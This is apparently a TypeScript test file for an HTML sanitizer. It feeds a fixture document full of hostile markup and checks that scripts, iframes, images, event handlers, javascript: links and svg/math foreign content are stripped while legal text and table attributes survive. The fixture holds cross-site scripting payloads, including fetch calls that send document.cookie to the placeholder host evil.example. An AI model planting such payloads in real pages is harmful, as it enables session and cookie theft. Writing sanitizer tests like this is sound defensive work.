import { describe, it, expect } from "vitest";
import { sanitizeDocumentHtml } from "@/lib/run-report/sanitize";
import type { SanitizedNode, SanitizedElement } from "@/lib/run-report/types";

const FULL_DOCUMENT = `<!doctype html>
<html lang="en">
<head>
  <title>secret</title>
  <style>body { background: url('https://tracker.example/beacon.png'); }</style>
  <script>fetch('https://evil.example/?c='+document.cookie)</script>
</head>
<body>
  <h1 id="t" class="x" style="color:red">Contract of Sale</h1>
  <img src="x" onerror="fetch('https://evil.example/'+document.cookie)">
  <a href="javascript:alert(1)" target="_blank">bad</a>
  <a href="https://good.example/doc" target="_blank">good</a>
  <svg><foreignObject><script>alert(2)</script></foreignObject></svg>
  <math><mtext><script>alert(3)</script></mtext></math>
  <iframe src="https://evil.example"></iframe>
  <p>Docket <em>No. 2024</em>-CV-1187 and cap of $2,000,000.</p>
  <table><tr><td colspan="2" onclick="steal()">cell</td></tr></table>
</body>
</html>`;

function walk(nodes: SanitizedNode[], visit: (el: SanitizedElement) => void) {
  for (const node of nodes) {
    if (typeof node === "string") continue;
    visit(node);
    if (node.c) walk(node.c, visit);
  }
}

function tagsIn(nodes: SanitizedNode[]): Set<string> {
  const tags = new Set<string>();
  walk(nodes, (el) => tags.add(el.t));
  return tags;
}

describe("sanitizeDocumentHtml — hostile markup", () => {
  const { nodes } = sanitizeDocumentHtml(FULL_DOCUMENT);
  const json = JSON.stringify(nodes);
  const tags = tagsIn(nodes);

  it("strips script, style and iframe", () => {
    expect(tags.has("script")).toBe(false);
    expect(tags.has("style")).toBe(false);
    expect(tags.has("iframe")).toBe(false);
    expect(json).not.toContain("document.cookie");
  });

  it("strips img entirely (beacon channel)", () => {
    expect(tags.has("img")).toBe(false);
  });

  it("strips svg and math foreign content", () => {
    expect(tags.has("svg")).toBe(false);
    expect(tags.has("math")).toBe(false);
    expect(tags.has("foreignObject")).toBe(false);
  });

  it("strips every on* handler", () => {
    expect(json.toLowerCase()).not.toContain("onerror");
    expect(json.toLowerCase()).not.toContain("onclick");
  });

  it("drops a javascript: href but keeps http(s)", () => {
    expect(json).not.toContain("javascript:");
    expect(json).toContain("https://good.example/doc");
  });

  it("drops class, id, style and target", () => {
    expect(json).not.toContain("color:red");
    expect(json).not.toContain("_blank");
    walk(nodes, (el) => {
      expect(el.a?.class).toBeUndefined();
      expect(el.a?.id).toBeUndefined();
      expect(el.a?.style).toBeUndefined();
      expect(el.a?.target).toBeUndefined();
    });
  });

  it("forces rel=noopener noreferrer on every surviving anchor", () => {
    walk(nodes, (el) => {
      if (el.t === "a") expect(el.a?.rel).toBe("noopener noreferrer");
    });
  });
});

describe("sanitizeDocumentHtml — document-mode parsing", () => {
  it("discards the doctype/html/head wrappers and keeps body children", () => {
    const { nodes } = sanitizeDocumentHtml(FULL_DOCUMENT);
    const tags = tagsIn(nodes);
    expect(tags.has("html")).toBe(false);
    expect(tags.has("head")).toBe(false);
    expect(tags.has("body")).toBe(false);
    expect(tags.has("h1")).toBe(true);
    expect(tags.has("p")).toBe(true);
  });

  it("handles a bare fragment with no wrapper", () => {
    const { nodes } = sanitizeDocumentHtml("<p>hello <strong>there</strong></p>");
    expect(tagsIn(nodes).has("p")).toBe(true);
    expect(JSON.stringify(nodes)).toContain("there");
  });

  it("returns empty for empty or non-string input rather than throwing", () => {
    expect(sanitizeDocumentHtml("").nodes).toEqual([]);
    expect(sanitizeDocumentHtml(undefined as unknown as string).nodes).toEqual([]);
  });
});

describe("sanitizeDocumentHtml — fidelity", () => {
  const { nodes } = sanitizeDocumentHtml(FULL_DOCUMENT);
  const json = JSON.stringify(nodes);

  it("preserves table colspan (hast property spelling differs from HTML)", () => {
    let found: string | undefined;
    walk(nodes, (el) => {
      if (el.t === "td" && el.a?.colspan) found = el.a.colspan;
    });
    expect(found).toBe("2");
  });

  it("preserves legal text split across inline tags", () => {
    expect(json).toContain("No. 2024");
    expect(json).toContain("$2,000,000");
  });
});

describe("sanitizeDocumentHtml — projection shape", () => {
  it("emits only strings and {t,a,c} objects", () => {
    const { nodes } = sanitizeDocumentHtml(FULL_DOCUMENT);
    const assertShape = (list: SanitizedNode[]) => {
      for (const node of list) {
        if (typeof node === "string") continue;
        expect(Object.keys(node).every((k) => ["t", "a", "c"].includes(k))).toBe(true);
        expect(typeof node.t).toBe("string");
        if (node.a) {
          for (const value of Object.values(node.a)) expect(typeof value).toBe("string");
        }
        if (node.c) assertShape(node.c);
      }
    };
    assertShape(nodes);
  });

  it("reports a non-zero drop count for hostile input", () => {
    expect(sanitizeDocumentHtml(FULL_DOCUMENT).droppedCount).toBeGreaterThan(0);
  });
});
